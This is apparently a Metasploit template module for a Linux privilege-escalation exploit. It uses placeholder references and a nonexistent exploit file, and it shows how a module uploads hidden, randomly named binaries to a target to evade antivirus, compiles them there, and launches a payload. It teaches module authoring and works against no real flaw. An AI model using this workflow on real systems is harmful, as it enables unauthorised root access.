# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This exploit sample shows how an exploit module could be written to exploit
# a bug in a command on a linux computer for priv esc.
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Post::Linux::Kernel
  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(
      update_info(
        info,
        # The Name should be just like the line of a Git commit - software name,
        # vuln type, class. Preferably apply
        # some search optimization so people can actually find the module.
        # We encourage consistency between module name and file name.
        &#039;Name&#039;           => &#039;Sample Linux Priv Esc&#039;,
        &#039;Description&#039;    => %q(
            This exploit module illustrates how a vulnerability could be exploited
          in an linux command for priv esc.
        ),
        &#039;License&#039;        => MSF_LICENSE,
        # The place to add your name/handle and email.  Twitter and other contact info isn&#039;t handled here.
        # Add reference to additional authors, like those creating original proof of concepts or
        # reference materials.
        # It is also common to comment in who did what (PoC vs metasploit module, etc)
        &#039;Author&#039;         =>
          [
            &#039;h00die <mike@stcyrsecurity.com>&#039;, # msf module
            &#039;researcher&#039; # original PoC, analysis
          ],
        &#039;Platform&#039;       => [ &#039;linux&#039; ],
        # from underlying architecture of the system.  typically ARCH_X64 or ARCH_X86, but the exploit
        # may only apply to say ARCH_PPC or something else, where a specific arch is required.
        # A full list is available in lib/msf/core/payload/uuid.rb
        &#039;Arch&#039;           => [ ARCH_X86, ARCH_X64 ],
        # What types of sessions we can use this module in conjunction with.  Most modules use libraries
        # test both to ensure compatibility.
        &#039;Targets&#039;        => [[ &#039;Auto&#039;, {} ]],
        # from lib/msf/core/module/privileged, denotes if this requires or gives privileged access
        # since privilege escalation modules typically result in elevated privileges, this is
        # generally set to true
        &#039;Privileged&#039;     => true,
        &#039;References&#039;     =>
          [
            [ &#039;OSVDB&#039;, &#039;12345&#039; ],
            [ &#039;EDB&#039;, &#039;12345&#039; ],
            [ &#039;URL&#039;, &#039;http://www.example.com&#039;],
            [ &#039;CVE&#039;, &#039;1978-1234&#039;]
          ],
        &#039;DisclosureDate&#039; => "Nov 29 2019",
        # Note that DefaultTarget refers to the index of an item in Targets, rather than name.
        # It&#039;s generally easiest just to put the default at the beginning of the list and skip this
        # entirely.
        &#039;DefaultTarget&#039;  => 0
      )
    )
    # is left for the user to gcc it themselves if there is an add OS or other dependency
    register_options [
      OptEnum.new(&#039;COMPILE&#039;, [ true, &#039;Compile on target&#039;, &#039;Auto&#039;, %w[Auto True False] ])
    ]
    # force exploit is used to bypass the check command results
    register_advanced_options [
      OptBool.new(&#039;ForceExploit&#039;,  [ false, &#039;Override check result&#039;, false ]),
      OptString.new(&#039;WritableDir&#039;, [ true, &#039;A directory where we can write files&#039;, &#039;/tmp&#039; ])
    ]

  end

  # Simplify pulling the writable directory variable
  def base_dir
    datastore[&#039;WritableDir&#039;].to_s
  end

  # Simplify and standardize uploading a file
  def upload(path, data)
    print_status "Writing &#039;#{path}&#039; (#{data.size} bytes) ..."
    write_file path, data
  end

  # Simplify uploading and chmoding a file
  def upload_and_chmodx(path, data)
    upload path, data
    chmod path
    register_file_for_cleanup path
  end

  # Simplify uploading and compiling a file
  def upload_and_compile(path, data, gcc_args=&#039;&#039;)
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? &#039;shell&#039;
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end

    if gcc_args.to_s.blank?
      gcc_cmd << " #{gcc_args}"
    end

    output = cmd_exec gcc_cmd

    unless output.blank?
      print_error output
      fail_with Failure::Unknown, "#{path}.c failed to compile"
    end

    register_file_for_cleanup path
    chmod path
  end

  # Pull the exploit binary or file (.c typically) from our system
  def exploit_data(file)
    ::File.binread ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;DOES_NOT_EXIST&#039;, file)
  end

  # If we&#039;re going to live compile on the system, check gcc is installed
  def live_compile?
    return false unless datastore[&#039;COMPILE&#039;].eql?(&#039;Auto&#039;) || datastore[&#039;COMPILE&#039;].eql?(&#039;True&#039;)

    if has_gcc?
      vprint_good &#039;gcc is installed&#039;
      return true
    end

    unless datastore[&#039;COMPILE&#039;].eql? &#039;Auto&#039;
      fail_with Failure::BadConfig, &#039;gcc is not installed. Compiling will fail.&#039;
    end
  end

  def check
    # Check the kernel version to see if its in a vulnerable range
    release = kernel_release
    if Gem::Version.new(release.split(&#039;-&#039;).first) > Gem::Version.new(&#039;4.14.11&#039;) ||
       Gem::Version.new(release.split(&#039;-&#039;).first) < Gem::Version.new(&#039;4.0&#039;)
      vprint_error "Kernel version #{release} is not vulnerable"
      return CheckCode::Safe
    end
    vprint_good "Kernel version #{release} appears to be vulnerable"

    # Check the app is installed and the version, debian based example
    package = cmd_exec(&#039;dpkg -l example | grep \&#039;^ii\&#039;&#039;)
    if package && package.include?(&#039;1:2015.3.14AR.1-1build1&#039;)
      print_good("Vulnerable app version #{package} detected")
      CheckCode::Appears
    end
    CheckCode::Safe
  end

  #
  # The exploit method drops a payload file to the system, then either compiles and runs
  # or just runs the exploit on the system.
  #
  def exploit
    # First check the system is vulnerable, or the user wants to run regardless
    unless check == CheckCode::Appears
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::NotVulnerable, &#039;Target is not vulnerable. Set ForceExploit to override.&#039;
      end
      print_warning &#039;Target does not appear to be vulnerable&#039;
    end

    # Check if we&#039;re already root
    if is_root?
      unless datastore[&#039;ForceExploit&#039;]
        fail_with Failure::BadConfig, &#039;Session already has root privileges. Set ForceExploit to override&#039;
      end
    end

    # Make sure we can write our exploit and payload to the remote system
    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    # Upload exploit executable, writing to a random name so AV doesn&#039;t have too easy a job
    executable_name = ".#{rand_text_alphanumeric(5..10)}"
    executable_path = "#{base_dir}/#{executable_name}"
    if live_compile?
      vprint_status &#039;Live compiling exploit on system...&#039;
      upload_and_compile executable_path, strip_comments(exploit_data(&#039;example.c&#039;))
      rm_f "#{executable_path}.c"
    else
      upload_and_chmodx executable_path, exploit_data(&#039;example&#039;)
    end

    # Upload payload executable
    payload_path = "#{base_dir}/.#{rand_text_alphanumeric(5..10)}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Launch exploit with a timeout.  We also have a vprint_status so if the user wants all the
    # output from the exploit being run, they can optionally see it
    timeout = 30
    print_status "Launching exploit..."
    output = cmd_exec "echo &#039;#{payload_path} & exit&#039; | #{executable_path}", nil, timeout
    output.each_line { |line| vprint_status line.chomp }
  end
end

